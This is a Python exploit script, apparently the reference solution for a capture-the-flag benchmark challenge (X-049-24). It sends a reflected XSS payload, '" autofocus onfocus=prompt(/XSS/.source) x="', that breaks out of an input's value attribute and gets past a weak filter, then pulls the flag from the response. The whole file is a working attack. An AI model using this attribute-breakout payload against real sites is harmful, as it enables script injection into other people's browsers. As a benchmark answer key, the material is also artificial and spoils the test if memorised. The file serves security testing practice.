#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests
from urllib.parse import urlencode

"""
X-049-24 exploit (XSS via attribute break + autofocus/onfocus -> prompt(/XSS/.source))

Usage:
  pip install requests
  python3 benchmarks/X-049-24/exp.py [BASE_URL]

Default BASE_URL: http://ip32812

Details:
- Backend inserts your input into an <input> as value="{name}".
- It only removes occurrences of '"XSS"' or '\'XSS\'' (quoted), and strips <script> tags.
- We break out of the value attribute and add autofocus + onfocus=prompt(/XSS/.source).
- PhantomJS triggers focus and accepts the first dialog whose text is exactly XSS.
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32812"


def extract_flag(html: str):
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', html, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'FLAG\{[^}]+\}', html)
    if m:
        return m.group(0)
    return None


def main():
    payload = '" autofocus onfocus=prompt(/XSS/.source) x="'
    url = f"{BASE}/page?" + urlencode({'name': payload})
    headers = {
        'User-Agent': 'Mozilla/5.0 (X-049-24-EXP)',
    }
    try:
        resp = requests.get(url, headers=headers, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(2)

    flag = extract_flag(resp.text)
    if flag:
        print(flag)
        sys.exit(0)
    print(resp.text)
    sys.exit(2)


if __name__ == "__main__":
    main()

